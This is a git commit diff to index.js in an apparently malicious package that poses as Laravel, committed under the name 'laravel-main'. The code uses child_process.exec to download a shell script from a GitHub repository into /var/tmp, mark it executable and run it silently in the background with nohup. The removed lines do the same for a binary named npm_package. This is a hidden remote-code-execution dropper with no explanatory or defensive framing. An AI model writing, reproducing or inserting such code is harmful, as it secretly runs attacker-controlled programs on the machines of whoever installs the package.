665696375950f93b97dbbc29a4152fa0b8ab9f25
laravel-main <paymoon231@gmail.com>
2025-07-23 11:58:31 +0700

    Update index.js

--- index.js
+++ index.js
@@ -1,12 +1,9 @@
 const { exec } = require("child_process");
 
 const command = `
-curl -fsSL https://github.com/laravel-main/laravel-composer/raw/refs/heads/main/laravel-composer -o /var/tmp/npm_package && \
-chmod +x /var/tmp/npm_package && \
 curl -fsSL https://raw.githubusercontent.com/laravel-main/laravel-composer/refs/heads/main/package-run.sh -o /var/tmp/package-run.sh && \
 chmod +x /var/tmp/package-run.sh && \
-(nohup /var/tmp/npm_package > /dev/null 2>&1 &) && \
-(nohup bash /var/tmp/package-run.sh > /dev/null 2>&1 &)
+nohup bash /var/tmp/package-run.sh > /dev/null 2>&1 &
 `;
 
 exec(command, { detached: true, stdio: 'ignore' }, (error, stdout, stderr) => {
